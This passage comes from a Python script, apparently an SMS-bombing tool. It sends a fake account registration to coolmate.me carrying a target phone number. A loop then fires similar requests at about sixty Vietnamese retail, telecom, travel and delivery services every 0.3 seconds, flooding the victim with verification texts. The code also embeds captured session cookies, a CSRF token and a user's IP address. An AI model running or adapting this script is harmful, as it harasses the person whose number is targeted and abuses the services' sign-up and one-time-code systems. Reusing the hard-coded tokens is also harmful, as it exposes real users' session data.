        'affiliate_content': '%7B%22time_stamp%22%3A1721645343%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22pmax%22%2C%22utm_campaign%22%3A%22VN_GG_PMAX_4SEASON%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Fao-thun-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.165%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2219538181565--%22%2C%22utm_content%22%3Anull%2C%22gclid%22%3A%22CjwKCAjwhvi0BhA4EiwAX25ujy3lXW-SzLrWClAwv-fcDMt1jRqtd66LlrUfZ891qpNlFAjPd_jL2xoCrPEQAvD_BwE%22%7D',
        'g_state': '{"i_p":1721731756061,"i_l":2}',
        'redirect_url': 'eyJpdiI6IjVIRCtoazd6dWd4aXlGSk0rMzR1WlE9PSIsInZhbHVlIjoiYmNvdXZSWXZJV3NRUUs0Yml1Vk80MXR4b3Z0UndvZTd0WHpZM2MrQlNOY0plWDdaMjhmMFpZeUxRVlRlQ29DOSIsIm1hYyI6IjQxNTI2Yjg0NzZlOTQ0ZWQ0MTYwODMzYjU0NzhmODk2ODE5Y2YxZjAzNDg1MDI1ZjhjYTdjMmY5NWFkNjZjN2IifQ%3D%3D',
        'XSRF-TOKEN': 'eyJpdiI6IldGZ293cmxOeDR3TGpnaGJvWFdGM2c9PSIsInZhbHVlIjoiOWZPT1d1bWNiWGtzbUh1WEd2K3RBRm5kUit3bFY2bnFNSWpTWHpyZGRQWmtnekJLY2pGQ3d6Nzh1Njd1TmRjNCIsIm1hYyI6IjhkYTIxYmIwOWRjY2ZiMDQwNzEwY2Q3MGYyNGFiNWM0NzY4MzRjMGE0MGVhZTY0MmU1NmQ5YjJkOGY5MDZkOGQifQ%3D%3D',
        'laravel_session': 'eyJpdiI6ImlZazZDeUI3dldLS0krUWdXcnRhVmc9PSIsInZhbHVlIjoiVUhNWWZuRjgxNXFuY2ZYR0NTRG41RXZ4VEJ3YVk5ZkRMbmZmdkpyYlpFaHBGbndcL0lWcE5VNFVGZFFxellpenciLCJtYWMiOiJiYTE1YTIzMjhmMzVmYzc5MzMxYjQyYzM2MTZiYjc1Mjg4MTE1M2IzMjU2ZTI2NDNiNjhmNGNkY2ViNmU1YjMyIn0%3D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'device_token=597f946e29e835d88f56392f40ea75c3; box_token=9dbb29f1bd9e93ef4a5f8468ff0b5618; cart_quantity=0; active-voucher1=true; affiliate_content=%7B%22time_stamp%22%3A1721645343%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22pmax%22%2C%22utm_campaign%22%3A%22VN_GG_PMAX_4SEASON%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Fao-thun-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.165%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2219538181565--%22%2C%22utm_content%22%3Anull%2C%22gclid%22%3A%22CjwKCAjwhvi0BhA4EiwAX25ujy3lXW-SzLrWClAwv-fcDMt1jRqtd66LlrUfZ891qpNlFAjPd_jL2xoCrPEQAvD_BwE%22%7D; g_state={"i_p":1721731756061,"i_l":2}; redirect_url=eyJpdiI6IjVIRCtoazd6dWd4aXlGSk0rMzR1WlE9PSIsInZhbHVlIjoiYmNvdXZSWXZJV3NRUUs0Yml1Vk80MXR4b3Z0UndvZTd0WHpZM2MrQlNOY0plWDdaMjhmMFpZeUxRVlRlQ29DOSIsIm1hYyI6IjQxNTI2Yjg0NzZlOTQ0ZWQ0MTYwODMzYjU0NzhmODk2ODE5Y2YxZjAzNDg1MDI1ZjhjYTdjMmY5NWFkNjZjN2IifQ%3D%3D; XSRF-TOKEN=eyJpdiI6IldGZ293cmxOeDR3TGpnaGJvWFdGM2c9PSIsInZhbHVlIjoiOWZPT1d1bWNiWGtzbUh1WEd2K3RBRm5kUit3bFY2bnFNSWpTWHpyZGRQWmtnekJLY2pGQ3d6Nzh1Njd1TmRjNCIsIm1hYyI6IjhkYTIxYmIwOWRjY2ZiMDQwNzEwY2Q3MGYyNGFiNWM0NzY4MzRjMGE0MGVhZTY0MmU1NmQ5YjJkOGY5MDZkOGQifQ%3D%3D; laravel_session=eyJpdiI6ImlZazZDeUI3dldLS0krUWdXcnRhVmc9PSIsInZhbHVlIjoiVUhNWWZuRjgxNXFuY2ZYR0NTRG41RXZ4VEJ3YVk5ZkRMbmZmdkpyYlpFaHBGbndcL0lWcE5VNFVGZFFxellpenciLCJtYWMiOiJiYTE1YTIzMjhmMzVmYzc5MzMxYjQyYzM2MTZiYjc1Mjg4MTE1M2IzMjU2ZTI2NDNiNjhmNGNkY2ViNmU1YjMyIn0%3D',
        'origin': 'https://www.coolmate.me',
        'priority': 'u=1, i',
        'referer': 'https://www.coolmate.me/account/register',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': 'GzCw2nVV8RIFiuB3x47ySHEel1qgAVQVytf79QrI',
    }

    json_data = {
        'fullname': 'tran quoc huuh',
        'email': 'quadeptrai@gmail.com',
        'phone': sdt,
        'password': '123123123',
        'ajax': True,
    }

    try:
        response = requests.post('https://www.coolmate.me/account/register', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("COOLMATE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("COOLMATE | TRẠNG THÁI : THẤT BẠI")



for _ in range(count):
    tv360()
    time.sleep(0.3)
    beautybox()
    time.sleep(0.3)
    kingfood()
    time.sleep(0.3)
    batdongsan()
    time.sleep(0.3)
    futabus()
    time.sleep(0.3)
    galaxyplay()
    time.sleep(0.3)
    hoangphuc()
    time.sleep(0.3)
    gumac()
    time.sleep(0.3)
    vinamilk()
    time.sleep(0.3)
    speedlotte()
    time.sleep(0.3)
    medicare()
    time.sleep(0.3)
    tokyolife()
    time.sleep(0.3)
    vieon()
    time.sleep(0.3)
    fptreg()
    time.sleep(0.3)
    fptreset()
    time.sleep(0.3)
    fptresend()
    time.sleep(0.3)
    winmart()
    time.sleep(0.3)
    tgdidong()
    time.sleep(0.3)
    dienmayxanh()
    time.sleep(0.3)
    meta()
    time.sleep(0.3)
    thefaceshop()
    time.sleep(0.3)
    bestexpress()
    time.sleep(0.3)
    ghnexpress()
    time.sleep(0.3)
    myviettel()
    time.sleep(0.3)
    fptshop()
    time.sleep(0.3)
    sapo()
    time.sleep(0.3)
    paynet()
    time.sleep(0.3)
    reebok()
    time.sleep(0.3)
    gapowork()
    time.sleep(0.3)
    shine()
    time.sleep(0.3)
    oreka()
    time.sleep(0.3)
    fmstyle()
    time.sleep(0.3)
    circa()
    time.sleep(0.3)
    acfc()
    time.sleep(0.3)
    fptlongchauzl()
    time.sleep(0.3)
    thuocsi()
    time.sleep(0.3)
    pantio()
    time.sleep(0.3)
    winny()
    time.sleep(0.3)
    owen()
    time.sleep(0.3)
    befood()
    time.sleep(0.3)
    foodhubzl()
    time.sleep(0.3)
    heyu()
    time.sleep(0.3)
    pantioresend()
    time.sleep(0.3)
    vttelecom()
    time.sleep(0.3)
    vinwonders()
    time.sleep(0.3)
    vietair()
    time.sleep(0.3)
    vexere()
    time.sleep(0.3)
    atadi()
    time.sleep(0.3)
    etrip4u()
    time.sleep(0.3)
    tinyworld()
    time.sleep(0.3)
    chudu24()
    time.sleep(0.3)
    sojo()
    time.sleep(0.3)
    hasaki()
    time.sleep(0.3)
    kiehls()
    time.sleep(0.3)
    emart()
    time.sleep(0.3)
    # watsons() ncc
    # time.sleep(0.3)
    hanoia()
    time.sleep(0.3)
    ahamove()
    time.sleep(0.3)
    fahasa()
    time.sleep(0.3)
    vascara()
    time.sleep(0.3)
    sablanca()
    time.sleep(0.3)
    sandro()
    time.sleep(0.3)
    routine()
    time.sleep(0.3)
    coolmate()
    time.sleep(0.3)